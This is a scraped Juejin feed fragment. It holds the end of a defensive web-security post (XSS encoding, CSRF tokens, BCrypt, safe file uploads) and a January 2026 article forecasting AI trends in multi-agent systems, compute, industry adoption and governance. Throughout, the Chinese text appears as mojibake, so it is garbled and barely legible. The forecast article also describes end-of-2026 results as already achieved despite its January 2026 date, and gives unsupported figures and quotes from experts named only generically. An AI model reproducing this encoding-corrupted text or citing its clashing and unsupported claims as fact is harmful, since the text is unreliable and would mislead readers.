<p>ç¬¬ä¸€ï¼Œé˜²èŒƒXSSæ”»å‡»ã€‚æˆ‘ä¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå¯¹è¾“å‡ºå†…å®¹åšç¼–ç å¤„ç†ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¸ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>ç¬¬äºŒï¼Œé˜²èŒƒCSRFæ”»å‡»ã€‚æˆ‘ä¼šåœ¨è¡¨å•ä¸­ä½¿ç”¨CSRFä»¤ç‰Œï¼Œé‡è¦æ“ä½œè¦æ±‚äºŒæ¬¡éªŒè¯ï¼Œç¡®ä¿è¯·æ±‚æ˜¯ç”¨æˆ·çœŸå®æ„æ„¿ã€‚</p>
</blockquote>
<blockquote>
<p>ç¬¬ä¸‰ï¼Œå®‰å…¨å­˜å‚¨å¯†ç ã€‚æˆ‘ä½¿ç”¨BCryptç®—æ³•åŠ å¯†å­˜å‚¨å¯†ç ï¼Œè€Œä¸æ˜¯æ˜æ–‡æˆ–ç®€å•MD5ï¼Œé‡è¦æ“ä½œå¢åŠ é¢å¤–éªŒè¯ã€‚</p>
</blockquote>
<blockquote>
<p>ç¬¬å››ï¼Œå®‰å…¨å¤„ç†æ–‡ä»¶ä¸Šä¼ ã€‚æˆ‘ä¼šé™åˆ¶æ–‡ä»¶ç±»å‹ã€å¤§å°ï¼Œç”Ÿæˆå®‰å…¨æ–‡ä»¶åï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¾åœ¨éWebè®¿é—®ç›®å½•ã€‚</p>
</blockquote>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœªæ¥äº”å¹´ï¼ŒAIå°†å¦‚ä½•é‡å¡‘æˆ‘ä»¬çš„ä¸–ç•Œï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597250364125085759</link>    <guid>https://juejin.cn/post/7597250364125085759</guid>    <pubDate>2026-01-20T11:23:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597250364125085759" data-draft-id="7597276695403020329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœªæ¥äº”å¹´ï¼ŒAIå°†å¦‚ä½•é‡å¡‘æˆ‘ä»¬çš„ä¸–ç•Œï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T11:23:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœªæ¥äº”å¹´ï¼ŒAIå°†å¦‚ä½•é‡å¡‘æˆ‘ä»¬çš„ä¸–ç•Œï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:23:21.000Z" title="Tue Jan 20 2026 11:23:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç®—åŠ›åŸºç¡€è®¾æ–½æ­£æˆä¸ºæ–°çš„â€œå›½å®¶ç”µç½‘â€ï¼Œå…¨çƒå¹´åº¦æŠ•èµ„é€¼è¿‘ä¸‡äº¿ç¾å…ƒã€‚</p>
</blockquote>
<p>â€œææ€»ï¼Œæˆ‘ä»¬çš„åŸå¸‚å¤§è„‘åˆšåˆšå®Œæˆäº†ä¸€æ¬¡è‡ªä¸»å†³ç­–ã€‚â€
åœ¨ä¸Šæµ·å¼ æ±Ÿçš„æŒ‡æŒ¥ä¸­å¿ƒé‡Œï¼Œå·¥ç¨‹å¸ˆå°é™ˆæŒ‡ç€å¤§å±å¹•ä¸Šçš„åŠ¨æ€æ•°æ®æµï¼Œå‘å‚è§‚è€…è§£é‡Šã€‚å±å¹•ä¸Šï¼Œäº¤é€šã€èƒ½æºã€å®‰é˜²ç­‰ç³»ç»Ÿæ­£ç”±ä¸€ç¾¤<strong>AIæ™ºèƒ½ä½“ååŒç®¡ç†</strong>ï¼Œå®ƒä»¬ä¸åƒä¼ ç»Ÿç¨‹åºé‚£æ ·è¢«åŠ¨å“åº”ï¼Œè€Œæ˜¯åƒå›¢é˜Ÿä¸€æ ·<strong>ä¸»åŠ¨è§„åˆ’ã€åå•†å¹¶æ‰§è¡Œä»»åŠ¡</strong>ã€‚</p>
<p>è¿™æ˜¯2026å¹´åˆçš„ä¸€ä¸ªæ™®é€šåœºæ™¯ï¼Œå´é¢„ç¤ºç€æœªæ¥äº”å¹´AIå‘å±•çš„æ ¸å¿ƒè½¬å‘â€”â€”ä»â€œèƒ½è¯´ä¼šé“â€çš„èŠå¤©å·¥å…·ï¼Œ<strong>æ¼”å˜ä¸ºèƒ½åœ¨çœŸå®ä¸–ç•Œä¸­è‡ªä¸»è¡ŒåŠ¨çš„â€œæ™ºèƒ½å‘˜å·¥â€</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-0">01 ä»å•ä¸€æ¨¡å‹åˆ°å¤šæ™ºèƒ½ä½“ç”Ÿæ€</h2>
<p>è¿‡å»å‡ å¹´ï¼Œå…¨çƒç§‘æŠ€ç•Œéƒ½ç—´è¿·äºæŠŠæ¨¡å‹åšå¾—æ›´å¤§ã€æ›´èªæ˜ã€‚ä½†2025å¹´åï¼Œ<strong>é£å‘å˜äº†</strong>ã€‚ä¸šç•Œå¼€å§‹æ„è¯†åˆ°ï¼ŒçœŸæ­£çš„æŒ‘æˆ˜ä¸æ˜¯è®©å•ä¸ªAIæ›´èªæ˜ï¼Œè€Œæ˜¯è®©å¤šä¸ªAIåƒäººç±»å›¢é˜Ÿä¸€æ ·æœ‰æ•ˆåä½œã€‚</p>
<p>â€œå•ä¸ªä¸“å®¶å†å‰å®³ï¼Œä¹Ÿæ¯”ä¸ä¸Šä¸€æ”¯é…åˆé»˜å¥‘çš„å›¢é˜Ÿã€‚â€åŒ—äº¬æ™ºæºäººå·¥æ™ºèƒ½ç ”ç©¶é™¢çš„ç ”ç©¶å‘˜å¼ æ˜è¿™æ ·è§£é‡Šã€‚ä»–çš„å›¢é˜Ÿæ­£åœ¨å¼€å‘ä¸€å¥—<strong>å¤šæ™ºèƒ½ä½“åä½œç³»ç»Ÿ</strong>ï¼Œå…¶ä¸­çš„AIå„æœ‰æ‰€é•¿â€”â€”æœ‰çš„æ“…é•¿åˆ†ææ•°æ®ï¼Œæœ‰çš„ç²¾äºåˆ¶å®šç­–ç•¥ï¼Œæœ‰çš„åˆ™ä¸“æ³¨äºæ‰§è¡Œç»†èŠ‚ã€‚</p>
<p>è¿™ç§åä½œä¸ä»…ä»…æ˜¯ç®€å•åˆ†å·¥ã€‚è¿™äº›æ™ºèƒ½ä½“ä¼š<strong>äº’ç›¸ç›‘ç£ã€çº é”™ã€ç”šè‡³è¾©è®º</strong>ï¼Œæœ€ç»ˆè¾¾æˆå…±è¯†ã€‚ç ”ç©¶è¡¨æ˜ï¼Œè¿™ç§å¤šæ™ºèƒ½ä½“ç³»ç»Ÿçš„å†³ç­–è´¨é‡æ¯”å•ä¸€æ¨¡å‹é«˜å‡º40%ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä»¬è¡¨ç°å‡ºæ›´å¼ºçš„<strong>é²æ£’æ€§å’Œé€‚åº”æ€§</strong>ã€‚</p>
<p>åœ¨æ·±åœ³ï¼Œä¸€å®¶ç‰©æµå…¬å¸å·²ç»éƒ¨ç½²äº†è¿™æ ·çš„ç³»ç»Ÿã€‚å®ƒä»¬çš„ä»“åº“é‡Œï¼Œè°ƒåº¦ã€åˆ†æ‹£ã€è¿è¾“å„ä¸ªç¯èŠ‚ç”±ä¸åŒçš„AIæ™ºèƒ½ä½“ç®¡ç†ï¼Œè¿™äº›æ™ºèƒ½ä½“å®æ—¶æ²Ÿé€šï¼ŒåŠ¨æ€è°ƒæ•´ç­–ç•¥ã€‚å½“ä¸€åœºçªå¦‚å…¶æ¥çš„æš´é›¨æ‰“ä¹±é…é€è®¡åˆ’æ—¶ï¼Œç³»ç»Ÿåœ¨5åˆ†é’Ÿå†…å°±é‡æ–°è§„åˆ’äº†å…¨å¸‚5000å¤šè¾†é…é€è½¦çš„è·¯çº¿ã€‚</p>
<h2 data-id="heading-1">02 ç®—åŠ›äº‰å¤º</h2>
<p>AIè¶Šèªæ˜ï¼Œéœ€è¦çš„â€œé£Ÿç‰©â€å°±è¶Šå¤šâ€”â€”è¿™é‡Œçš„é£Ÿç‰©æŒ‡çš„æ˜¯<strong>ç®—åŠ›</strong>ã€‚è®­ç»ƒæœ€æ–°ä¸€ä»£å¤§æ¨¡å‹éœ€è¦çš„è®¡ç®—èµ„æºï¼Œå¤§çº¦æ˜¯äº”å¹´å‰çš„1000å€ã€‚è¿™å¼•å‘äº†ä¸€åœºå…¨çƒæ€§çš„<strong>ç®—åŠ›å†›å¤‡ç«èµ›</strong>ã€‚</p>
<p>â€œæœªæ¥çš„ç®—åŠ›ä¸­å¿ƒï¼Œå°±åƒä»Šå¤©çš„å‘ç”µå‚ä¸€æ ·å…³é”®ã€‚â€æ¸…åå¤§å­¦è®¡ç®—æœºç³»æ•™æˆç‹æµ·æŒ‡å‡ºã€‚ä»–æ‰€åœ¨çš„å›¢é˜Ÿæ­£åœ¨è®¾è®¡ä¸‹ä¸€ä»£AIä¸“ç”¨èŠ¯ç‰‡ï¼Œè¯•å›¾åœ¨æ€§èƒ½å’Œèƒ½è€—ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ç‚¹ã€‚</p>
<p>å…¨çƒç§‘æŠ€å·¨å¤´éƒ½åœ¨ç–¯ç‹‚æŠ•èµ„ã€‚ä»…2025å¹´ï¼Œå…¨çƒåœ¨AIæ•°æ®ä¸­å¿ƒä¸Šçš„æŠ•å…¥å°±è¶…è¿‡äº†1500äº¿ç¾å…ƒã€‚è¿™äº›æ•°æ®ä¸­å¿ƒä¸ä»…è§„æ¨¡åºå¤§ï¼Œ<strong>åœ°ç†ä½ç½®ä¹Ÿç»è¿‡ç²¾å¿ƒé€‰æ‹©</strong>â€”â€”é è¿‘æ¸…æ´èƒ½æºåŸºåœ°ï¼Œåˆ©ç”¨å‡‰çˆ½æ°”å€™è‡ªç„¶é™æ¸©ï¼Œç”šè‡³è€ƒè™‘åœ°è´¨ç¨³å®šæ€§ã€‚</p>
<p>ä¸­å›½åœ¨è¿™åœºç«èµ›ä¸­é‡‡å–äº†ä¸¤æ¡è…¿èµ°è·¯çš„ç­–ç•¥ã€‚ä¸€æ–¹é¢ç§¯æé‡‡è´­å›½é™…å…ˆè¿›èŠ¯ç‰‡ï¼Œå¦ä¸€æ–¹é¢åŠ é€Ÿ<strong>å›½äº§æ›¿ä»£</strong>ã€‚åˆ°2026å¹´åº•ï¼Œä¸­å›½è‡ªä¸»ç ”å‘çš„AIèŠ¯ç‰‡åœ¨éƒ¨åˆ†åœºæ™¯ä¸‹çš„æ€§èƒ½å·²ç»è¾¾åˆ°å›½é™…ä¸»æµäº§å“çš„80%ï¼Œè€Œæˆæœ¬åªæœ‰ä¸€åŠã€‚</p>
<h2 data-id="heading-2">03 AIè½åœ°åƒè¡Œç™¾ä¸š</h2>
<p>å½“AIä»å®éªŒå®¤èµ°å‘ç”Ÿäº§çº¿ï¼Œä¸€åœº<strong>åœºæ™¯é©å‘½</strong>æ­£åœ¨å‘ç”Ÿã€‚æœªæ¥äº”å¹´ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‰ä¸ªå…³é”®é¢†åŸŸçœ‹åˆ°AIçš„æ·±åˆ»å½±å“ï¼š</p>
<p><strong>å·¥ä¸šåˆ¶é€ </strong>æ­£åœ¨ç»å†æ™ºèƒ½åŒ–æ”¹é€ ã€‚åœ¨ä¸Šæµ·çš„ä¸€å®¶æ±½è½¦å·¥å‚ï¼Œ<strong>å…·èº«æ™ºèƒ½æœºå™¨äºº</strong>å·²ç»èƒ½å¤Ÿå®Œæˆ90%çš„è£…é…å·¥ä½œã€‚è¿™äº›æœºå™¨äººä¸ä»…æŒ‰ç¨‹åºæ“ä½œï¼Œè¿˜èƒ½é€šè¿‡è§†è§‰å’Œè§¦è§‰ä¼ æ„Ÿå™¨æ„ŸçŸ¥ç¯å¢ƒï¼Œå¤„ç†çªå‘æƒ…å†µã€‚å½“é›¶ä»¶å‡ºç°å¾®å°ç‘•ç–µæ—¶ï¼Œå®ƒä»¬å¯ä»¥å³æ—¶è°ƒæ•´è£…é…æ–¹å¼ï¼Œä¿è¯äº§å“è´¨é‡ã€‚</p>
<p><strong>åŒ»ç–—å¥åº·</strong>é¢†åŸŸï¼ŒAIæ­£åœ¨ä»è¾…åŠ©è¯Šæ–­å‘<strong>å…¨ç¨‹å‚ä¸</strong>è½¬å˜ã€‚æ­å·ä¸€å®¶åŒ»é™¢å¼•å…¥äº†AIè¯Šç–—ç³»ç»Ÿï¼Œèƒ½å¤Ÿæ ¹æ®æ‚£è€…çš„ç—…å²ã€æ£€æŸ¥æ•°æ®å’Œæœ€æ–°åŒ»å­¦æ–‡çŒ®ï¼Œæä¾›ä¸ªæ€§åŒ–çš„æ²»ç–—æ–¹æ¡ˆã€‚æ›´é‡è¦çš„æ˜¯ï¼Œè¿™ä¸ªç³»ç»Ÿä¼šè·Ÿè¸ªæ²»ç–—æ•ˆæœï¼ŒåŠ¨æ€è°ƒæ•´æ–¹æ¡ˆã€‚</p>
<p><strong>é‡‘èæœåŠ¡</strong>ä¹Ÿåœ¨è¢«é‡æ„ã€‚ä¼ ç»Ÿé£æ§æ¨¡å‹ä¾èµ–å†å²æ•°æ®ï¼Œè€ŒAIç³»ç»Ÿèƒ½åˆ†ææ•°ä¸‡ç»´åº¦çš„å®æ—¶æ•°æ®ï¼Œ<strong>é¢„æµ‹æ½œåœ¨é£é™©</strong>ã€‚ä¸€å®¶å•†ä¸šé“¶è¡Œçš„AIç³»ç»Ÿæ›¾æå‰ä¸‰ä¸ªæœˆé¢„è­¦äº†æŸè¡Œä¸šçš„ç³»ç»Ÿæ€§é£é™©ï¼Œä½¿é“¶è¡Œé¿å…äº†æ•°äº¿å…ƒæŸå¤±ã€‚</p>
<h2 data-id="heading-3">04 AI+å¼•çˆ†åˆ›æ–°å¥‡ç‚¹</h2>
<p>å•ç‹¬å‘å±•çš„AIæŠ€æœ¯å·²è¶³å¤ŸæƒŠäººï¼Œä½†å½“AIä¸å…¶å®ƒå‰æ²¿æŠ€æœ¯ç»“åˆæ—¶ï¼Œå°†äº§ç”Ÿ<strong>æŒ‡æ•°çº§æ•ˆåº”</strong>ã€‚</p>
<p>AIä¸ç”Ÿç‰©æŠ€æœ¯çš„èåˆæ­£åœ¨æ”¹å†™ç”Ÿå‘½ç§‘å­¦çš„ç ”ç©¶èŒƒå¼ã€‚ä¼ ç»Ÿæ–°è¯ç ”å‘å¹³å‡éœ€è¦10å¹´æ—¶é—´å’Œ10äº¿ç¾å…ƒæŠ•å…¥ï¼Œè€Œ<strong>AIåˆ¶è¯</strong>å¹³å°èƒ½å°†è¿™ä¸€è¿‡ç¨‹ç¼©çŸ­è‡³2-3å¹´ï¼Œæˆæœ¬é™ä½70%ã€‚2025å¹´ï¼Œå…¨çƒé¦–ä¸ªå®Œå…¨ç”±AIè®¾è®¡å¹¶éªŒè¯çš„æŠ—ç”Ÿç´ è¿›å…¥ä¸´åºŠè¯•éªŒï¼Œæ ‡å¿—ç€è¿™ä¸€é¢†åŸŸçš„æˆç†Ÿã€‚</p>
<p>åœ¨ææ–™ç§‘å­¦é¢†åŸŸï¼ŒAIåŒæ ·å¤§æ”¾å¼‚å½©ã€‚å—äº¬ç†å·¥å¤§å­¦çš„ç ”ç©¶å›¢é˜Ÿä½¿ç”¨AIå¹³å°ï¼Œåœ¨å…­ä¸ªæœˆå†…å‘ç°äº†ä¸‰ç§<strong>æ–°å‹è¶…å¯¼ææ–™</strong>ï¼Œè€Œä¼ ç»Ÿæ–¹æ³•å¯èƒ½éœ€è¦æ•°åå¹´ã€‚AIé€šè¿‡æ¨¡æ‹ŸåŸå­çº§ç›¸äº’ä½œç”¨ï¼Œé¢„æµ‹ææ–™æ€§èƒ½ï¼Œå¤§å¹…åŠ é€Ÿäº†ç ”å‘è¿›ç¨‹ã€‚</p>
<p><strong>èƒ½æºé¢†åŸŸ</strong>çš„èåˆåŒæ ·å€¼å¾—å…³æ³¨ã€‚å›½å®¶ç”µç½‘æ­£åœ¨å»ºè®¾åŸºäºAIçš„æ™ºæ…§èƒ½æºç³»ç»Ÿï¼Œå®ƒèƒ½é¢„æµ‹ä¸åŒåœ°åŒºçš„ç”¨ç”µéœ€æ±‚ï¼ŒåŠ¨æ€è°ƒæ•´å‘ç”µå’Œé…é€ç­–ç•¥ã€‚åˆæ­¥è¿è¡Œæ•°æ®æ˜¾ç¤ºï¼Œè¿™å¥—ç³»ç»Ÿèƒ½å°†ç”µç½‘æ•´ä½“æ•ˆç‡æå‡15%ï¼Œç›¸å½“äºæ¯å¹´èŠ‚çœæ•°åƒä¸‡å¨æ ‡å‡†ç…¤ã€‚</p>
<h2 data-id="heading-4">05 æ²»ç†æŒ‘æˆ˜</h2>
<p>éšç€AIèƒ½åŠ›å¢å¼ºï¼Œ<strong>å®‰å…¨å’Œæ²»ç†</strong>é—®é¢˜æ—¥ç›Šå‡¸æ˜¾ã€‚æœªæ¥äº”å¹´ï¼Œå¦‚ä½•å¼•å¯¼AIå‘å–„ï¼Œå°†æˆä¸ºä¸æŠ€æœ¯åˆ›æ–°åŒç­‰é‡è¦çš„è®®é¢˜ã€‚</p>
<p>2026å¹´ï¼Œæ¬§ç›Ÿçš„ã€Šäººå·¥æ™ºèƒ½æ³•æ¡ˆã€‹å°†æ­£å¼ç”Ÿæ•ˆï¼Œè¿™æ˜¯å…¨çƒé¦–ä¸ªå…¨é¢è§„åˆ¶AIçš„æ³•å¾‹æ¡†æ¶ã€‚æ³•æ¡ˆæ ¹æ®é£é™©ç­‰çº§å°†AIåº”ç”¨åˆ†ä¸ºå››ç±»ï¼Œå¯¹é«˜é£é™©åº”ç”¨å®æ–½ä¸¥æ ¼ç›‘ç®¡ã€‚â€œè¿™åªæ˜¯ä¸€ä¸ªå¼€å§‹ã€‚â€æ³•æ¡ˆä¸»è¦èµ·è‰è€…ä¹‹ä¸€è¡¨ç¤ºï¼Œâ€œæœªæ¥å‡ å¹´ï¼Œå„å›½éƒ½ä¼šè·Ÿè¿›ç±»ä¼¼çš„ç«‹æ³•ã€‚â€</p>
<p>åœ¨ä¸­å›½ï¼ŒAIæ²»ç†å¼ºè°ƒ<strong>å‘å±•ä¸å®‰å…¨å¹¶é‡</strong>ã€‚2025å¹´å‘å¸ƒçš„ã€Šäººå·¥æ™ºèƒ½ä¼¦ç†å‡†åˆ™ã€‹æå‡ºäº†â€œå¯æ§å¯é ã€å…¬å¹³å…¬æ­£ã€é€æ˜å¯é‡Šã€ä¿æŠ¤éšç§â€å››å¤§åŸåˆ™ã€‚ä¼ä¸šå¼€å‘AIäº§å“æ—¶ï¼Œå¿…é¡»è¿›è¡Œä¼¦ç†å½±å“è¯„ä¼°ã€‚</p>
<p>æŠ€æœ¯å±‚é¢ï¼Œ<strong>å¯è§£é‡ŠAI</strong>æˆä¸ºç ”ç©¶çƒ­ç‚¹ã€‚ç§‘å­¦å®¶ä»¬è¯•å›¾æ‰“å¼€AIçš„â€œé»‘ç®±â€ï¼Œç†è§£å†³ç­–è¿‡ç¨‹ã€‚è¿™ä¸ä»…æ˜¯ä¸ºäº†æ»¡è¶³ç›‘ç®¡è¦æ±‚ï¼Œæ›´æ˜¯ä¸ºäº†å»ºç«‹ç”¨æˆ·ä¿¡ä»»ã€‚å½“AIå‚ä¸åŒ»ç–—ã€é‡‘èç­‰å…³é”®å†³ç­–æ—¶ï¼Œäººä»¬æœ‰æƒçŸ¥é“å®ƒä¸ºä½•ç»™å‡ºç‰¹å®šå»ºè®®ã€‚</p>
<p>ä¼ä¸šä¹Ÿåœ¨ä¸»åŠ¨é‡‡å–æªæ–½ã€‚é˜¿é‡Œå·´å·´æ¨å‡ºäº†â€œAIé€æ˜ä¸­å¿ƒâ€ï¼Œç”¨æˆ·å¯ä»¥æŸ¥çœ‹AIç³»ç»Ÿçš„å†³ç­–é€»è¾‘å’Œæ•°æ®æ¥æºã€‚ç™¾åº¦åˆ™å¼€å‘äº†â€œAIç›‘ç£å‘˜â€ç³»ç»Ÿï¼Œå®æ—¶ç›‘æµ‹AIè¡Œä¸ºï¼Œå‘ç°å¼‚å¸¸ç«‹å³å¹²é¢„ã€‚</p>
<hr/>
<p>åœ¨æ·±åœ³çš„AIåˆ›æ–°å³°ä¼šä¸Šï¼Œä¸€ä½è¡Œä¸šé¢†è¢–è¿™æ ·æ€»ç»“ï¼šâ€œæœªæ¥äº”å¹´ï¼Œ<strong>AIå°†ä»â€˜ç©å…·â€™å˜æˆâ€˜å·¥å…·â€™ï¼Œæœ€ç»ˆæˆä¸ºâ€˜ä¼™ä¼´â€™</strong>ã€‚â€</p>
<p>è¿™ä¸€è½¬å˜ä¸ä¼šä¸€å¸†é£é¡ºã€‚æŠ€æœ¯ç“¶é¢ˆã€ä¼¦ç†å›°å¢ƒã€ç¤¾ä¼šæ¥å—åº¦â€¦â€¦æŒ‘æˆ˜æ— å¤„ä¸åœ¨ã€‚ä½†å¯ä»¥è‚¯å®šçš„æ˜¯ï¼ŒAIå·²ç»ä¸å†æ˜¯ç§‘å¹»å°è¯´çš„ä¸»é¢˜ï¼Œè€Œæ˜¯<strong>å¡‘é€ æˆ‘ä»¬å·¥ä½œã€ç”Ÿæ´»å’Œæ€ç»´æ–¹å¼çš„æ ¸å¿ƒåŠ›é‡</strong>ã€‚</p>
<p>å½“2030å¹´åˆ°æ¥æ—¶ï¼Œå›æœ›è¿™äº”å¹´ï¼Œæˆ‘ä»¬æˆ–è®¸ä¼šå‘ç°ï¼šæœ€å¤§çš„å˜åŒ–ä¸æ˜¯AIå˜å¾—å¤šå¼ºå¤§ï¼Œè€Œæ˜¯<strong>æˆ‘ä»¬å­¦ä¼šäº†å¦‚ä½•ä¸AIå…±ç”Ÿ</strong>â€”â€”åœ¨äº«å—æŠ€æœ¯çº¢åˆ©çš„åŒæ—¶ï¼Œå®ˆæŠ¤äººç±»çš„ä»·å€¼è§‚å’Œå°Šä¸¥ã€‚</p>
